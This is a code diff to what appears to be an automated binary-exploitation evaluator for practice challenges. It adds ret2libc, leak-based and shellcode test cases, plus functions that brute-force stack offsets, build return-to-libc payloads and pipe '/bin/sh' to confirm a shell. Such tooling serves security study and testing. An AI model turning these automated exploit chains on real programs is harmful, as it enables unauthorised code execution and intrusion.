@@ -64,6 +64,9 @@ CASES = [
     ("pwn3", "格式化字符串（题目特有口令逻辑）", "unsupported", "PWNED"),
     ("leakmemory", "格式化字符串泄漏", "fmtstr_leak", "LEAK"),
     ("overwrite", "格式化字符串写 c=16", "fmtstr_write", "modified c."),
+    ("ret2libc2", "溢出 → gets(buf2) 后 system(buf2)", "auto", "PWNED"),
+    ("ret2libc3", "泄漏 puts → system", "auto", "PWNED"),
+    ("ret2shellcode", "栈 shellcode（需栈地址）", "auto", "PWNED"),
 ]
 
 
@@ -181,12 +184,22 @@ def evaluate(worker: PwntoolsWorker, name: str, note: str,
     library_call = next((chain for chain in chains if chain.chain_id == "libc-call"), None)
     syscall_chain = next((chain for chain in chains if chain.chain_id == "syscall-execve"), None)
 
+    staged_chain = next((chain for chain in chains if chain.chain_id == "staged-call"), None)
+    leak_chain = next((chain for chain in chains if chain.chain_id == "ret2libc-leak"), None)
+    shellcode_chain = next((chain for chain in chains if chain.chain_id == "ret2shellcode"), None)
+
     if library_call is not None:
         payloads, offsets, error = build_libc_payloads(profile, worker)
         mode = "libc-call"
     elif syscall_chain is not None:
         payloads, offsets, error = build_syscall_payloads(profile, worker)
         mode = "syscall-execve"
+    elif staged_chain is not None:
+        return evaluate_staged_call(worker, profile, marker, finish)
+    elif leak_chain is not None:
+        return evaluate_leak_chain(worker, profile, marker, finish)
+    elif shellcode_chain is not None:
+        return finish("unsupported", "needs_stack_address")
     elif strategy == "fmtstr_write" or strategy == "fmtstr_leak":
         return evaluate_format_string(worker, profile, strategy, marker, finish)
     else:
@@ -204,6 +217,45 @@ def evaluate(worker: PwntoolsWorker, name: str, note: str,
     index = result.get("index")
     return finish("solved", None, mode=mode,
                   offset=offsets[index] if index is not None else None,
+                  attempts=result.get("attempts"))
+
+
+def evaluate_staged_call(worker: PwntoolsWorker, profile, marker: str, finish) -> dict:
+    offsets = list(range(96, 141))
+    try:
+        built = worker.ret2libc_bss(profile.path, offsets)
+    except ToolUnavailable as error:
+        return finish("failed", str(error))
+    payloads = [bytes.fromhex(payload) for payload in built.get("payloads", [])]
+    if not payloads:
+        return finish("unsupported", "bss_payload_build_failed")
+    try:
+        result = worker.run_chain(profile.path, payloads,
+                                  post=b"/bin/sh\necho PWNED; exit\n",
+                                  marker=marker, timeout=2)
+    except ToolUnavailable as error:
+        return finish("failed", str(error))
+    if not result.get("solved"):
+        return finish("failed", "payload_failed", mode="staged-call",
+                      attempts=result.get("attempts"))
+    index = result.get("index")
+    return finish("solved", None, mode="staged-call",
+                  offset=offsets[index] if index is not None else None,
+                  attempts=result.get("attempts"))
+
+
+def evaluate_leak_chain(worker: PwntoolsWorker, profile, marker: str, finish) -> dict:
+    offsets = list(range(96, 141))
+    try:
+        result = worker.ret2libc_leak(profile.path, offsets)
+    except ToolUnavailable as error:
+        return finish("failed", str(error))
+    if not result.get("solved"):
+        return finish("unsupported" if result.get("error") else "failed",
+                      result.get("error") or "payload_failed",
+                      mode="ret2libc-leak", attempts=result.get("attempts"))
+    return finish("solved", None, mode="ret2libc-leak",
+                  offset=result.get("offset"), leak_offset=result.get("leak_offset"),
                   attempts=result.get("attempts"))
 
 
